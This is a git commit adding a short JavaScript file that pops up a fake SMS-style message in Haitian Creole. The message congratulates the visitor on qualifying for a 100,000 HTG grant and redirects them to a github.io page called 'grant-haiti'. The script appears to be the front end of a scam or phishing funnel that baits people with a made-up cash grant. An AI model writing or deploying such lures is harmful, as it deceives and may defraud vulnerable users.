dc55f7f53cecc1f32c295f665c64274f986a59d3
reallinks <joyparker838@gmail.com>
2024-12-30 00:28:21 +0100

    Create popsc.js

---
+++ popsc.js
@@ -0,0 +1,6 @@
+
+var password = 'sibvansyon 100,000 HTG'
+password=prompt('SMS :Felisitasyon , ou kalifye pou HTG 100,000 sibvansyon an, klike sou OK pou jwenn pa w la','sibvansyon 100,000 HTG');
+if (password != 'sibvansyon 100,000 HTG') {
+location.href='https://reallinks.github.io/grant-haiti';
+}
